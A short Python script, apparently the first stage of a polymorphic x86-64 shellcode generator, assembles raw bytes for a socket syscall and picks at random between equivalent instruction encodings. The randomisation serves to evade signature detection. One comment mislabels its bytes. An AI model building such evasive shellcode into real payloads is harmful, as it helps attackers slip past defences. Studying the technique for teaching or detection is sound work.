#!/usr/bin/env python3
import random
from func_instu import *

def partie1():

    # PARTIE : SOCKET

    
    moval = movxl("al",41) # mov al, 41
    movdil = movxl("dil",2) # mov dil, 2
    movsil = movxl("sil",1) # mov sil, 1
    movdl = movxl("dl",6) # mov dl, 6
    syscall = '\\x0f\\x05' # syscalls


    part1 = [
        '\\x50\\x41\\x58', # push rax, pop r8
        '\\x49\\x89\\xc0' # push r8, rax
    ]

    x = random.randint(0, 1)

    if x == 0 :
        choix = part1[0]
    elif x == 1 :
        choix = part1[1]

    
    print(f"OP 1 = {choix}")
    resultat = moval + movdil + movsil + movdl + syscall + choix

    print(f"Partie 1 = {resultat}")
    print("")

    return resultat    